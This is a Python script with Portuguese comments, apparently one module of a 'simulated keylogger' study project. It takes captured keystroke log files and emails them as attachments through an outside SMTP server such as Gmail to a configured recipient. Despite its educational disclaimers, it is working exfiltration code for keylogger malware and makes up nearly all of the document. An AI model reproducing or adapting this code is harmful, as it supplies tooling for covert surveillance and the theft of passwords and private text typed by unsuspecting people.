#!/usr/bin/env python3
"""
Keylogger Simulado - Envio de Logs por Email
=============================================

Este script envia os logs capturados por email usando SMTP.
Utiliza variaveis de ambiente para configuracao (nao hardcoded).

AVISO: Este script e para fins EDUCACIONAIS apenas.
Nao use para exfiltracao de dados maliciosa.

Uso:
    # Configura as variaveis de ambiente:
    export SMTP_SERVER="smtp.gmail.com"
    export SMTP_PORT="587"
    export EMAIL_USER="seu-email@gmail.com"
    export EMAIL_PASS="sua-senha-app"
    export EMAIL_DEST="destinatario@exemplo.com"

    # Execute:
    python email_sender.py

Saidas:
    - Email com log de teclas em anexo
    - Confirmacao de envio no terminal
"""

import os
import sys
import smtplib
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime


def carregar_configuracao():
    """Carrega configuracao de variaveis de ambiente."""
    config = {
        "smtp_server": os.getenv("SMTP_SERVER", "smtp.gmail.com"),
        "smtp_port": int(os.getenv("SMTP_PORT", "587")),
        "email_user": os.getenv("EMAIL_USER", ""),
        "email_pass": os.getenv("EMAIL_PASS", ""),
        "email_dest": os.getenv("EMAIL_DEST", ""),
    }
    
    # Verifica se as configuracoes estao presentes
    campos_obrigatorios = ["email_user", "email_pass", "email_dest"]
    for campo in campos_obrigatorios:
        if not config[campo]:
            print(f"[ERRO] Variavel de ambiente nao configurada: {campo.upper()}")
            print()
            print("Configure as variaveis de ambiente:")
            print('  export SMTP_SERVER="smtp.gmail.com"')
            print('  export SMTP_PORT="587"')
            print('  export EMAIL_USER="seu-email@gmail.com"')
            print('  export EMAIL_PASS="sua-senha-app"')
            print('  export EMAIL_DEST="destinatario@exemplo.com"')
            print()
            print("Para Gmail, use senhas de app:")
            print("  https://myaccount.google.com/apppasswords")
            sys.exit(1)
    
    return config


def listar_logs_disponiveis():
    """Lista arquivos de log disponiveis para envio."""
    log_dir = Path(__file__).parent / "logs"
    
    if not log_dir.exists():
        print("[ERRO] Diretorio de logs nao encontrado")
        return []
    
    logs = list(log_dir.glob("*.txt"))
    
    if not logs:
        print("[AVISO] Nenhum arquivo de log encontrado em logs/")
        return []
    
    # Ordena por data de modificacao (mais recente primeiro)
    logs.sort(key=lambda x: x.stat().st_mtime, reverse=True)
    
    return logs


def selecionar_log(logs):
    """Permite ao usuario selecionar qual log enviar."""
    print("\n[*] Logs disponiveis para envio:")
    print()
    
    for i, log in enumerate(logs, 1):
        tamanho = log.stat().st_size
        data_mod = datetime.fromtimestamp(log.stat().st_mtime)
        print(f"  {i}. {log.name}")
        print(f"     Tamanho: {tamanho:,} bytes")
        print(f"     Modificado: {data_mod.strftime('%d/%m/%Y %H:%M:%S')}")
        print()
    
    if len(logs) == 1:
        print("[*] Usando unico log disponivel")
        return logs[0]
    
    while True:
        try:
            escolha = input(f"[*] Selecione o log (1-{len(logs)}): ")
            indice = int(escolha) - 1
            if 0 <= indice < len(logs):
                return logs[indice]
            else:
                print("[ERRO] Opcao invalida")
        except ValueError:
            print("[ERRO] Digite um numero valido")


def criar_email(config, log_file):
    """Cria o email com o log em anexo."""
    # Cria a mensagem
    msg = MIMEMultipart()
    msg["From"] = config["email_user"]
    msg["To"] = config["email_dest"]
    msg["Subject"] = f"[LOG] Captura de Teclas - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
    
    # Corpo do email
    corpo = f"""
RELATORIO DE CAPTURA DE TECLAS
================================

Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
Arquivo: {log_file.name}
Tamanho: {log_file.stat().st_size:,} bytes

Este email contem o log de captura de teclas gerado pelo
keylogger simulado para fins de estudo.

================================
[PROJETO DE ESTUDO - NAO USAR EM PRODUCAO]
"""
    msg.attach(MIMEText(corpo, "plain"))
    
    # Anexa o arquivo de log
    with open(log_file, "rb") as f:
        parte = MIMEBase("application", "octet-stream")
        parte.set_payload(f.read())
    
    encoders.encode_base64(parte)
    parte.add_header(
        "Content-Disposition",
        f"attachment; filename={log_file.name}"
    )
    msg.attach(parte)
    
    return msg


def enviar_email(config, msg):
    """Envia o email via SMTP."""
    try:
        print(f"[*] Conectando a {config['smtp_server']}:{config['smtp_port']}...")
        
        # Conexao segura com TLS
        with smtplib.SMTP(config["smtp_server"], config["smtp_port"]) as servidor:
            servidor.starttls()  # Ativa criptografia TLS
            servidor.login(config["email_user"], config["email_pass"])
            servidor.send_message(msg)
        
        print("[+] Email enviado com sucesso!")
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("[ERRO] Falha na autenticacao SMTP")
        print("[DICA] Verifique email e senha")
        print("[DICA] Para Gmail, use senha de app:")
        print("       https://myaccount.google.com/apppasswords")
        return False
        
    except smtplib.SMTPException as e:
        print(f"[ERRO] Falha ao enviar email: {e}")
        return False
        
    except Exception as e:
        print(f"[ERRO] Erro inesperado: {e}")
        return False


def exibir_resumo_envio(log_file, config):
    """Exibe resumo do envio realizado."""
    print()
    print("=" * 60)
    print("  RESUMO DO ENVIO")
    print("=" * 60)
    print(f"  De: {config['email_user']}")
    print(f"  Para: {config['email_dest']}")
    print(f"  Arquivo: {log_file.name}")
    print(f"  Tamanho: {log_file.stat().st_size:,} bytes")
    print(f"  Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    print("=" * 60)


def main():
    """Funcao principal."""
    print("=" * 60)
    print("  KEYLOGGER SIMULADO - Envio por Email")
    print("  [PROJETO DE ESTUDO - NAO USAR EM PRODUCAO]")
    print("=" * 60)
    print()
    
    # Carrega configuracao
    config = carregar_configuracao()
    
    # Lista logs disponiveis
    logs = listar_logs_disponiveis()
    if not logs:
        sys.exit(1)
    
    # Seleciona log
    log_selecionado = selecionar_log(logs)
    print(f"[*] Log selecionado: {log_selecionado.name}")
    
    # Confirma envio
    print()
    confirmacao = input("[?] Confirmar envio? (s/n): ")
    if confirmacao.lower() != "s":
        print("[*] Envio cancelado")
        sys.exit(0)
    
    # Cria e envia email
    msg = criar_email(config, log_selecionado)
    
    if enviar_email(config, msg):
        exibir_resumo_envio(log_selecionado, config)
    
    print()


if __name__ == "__main__":
    main()
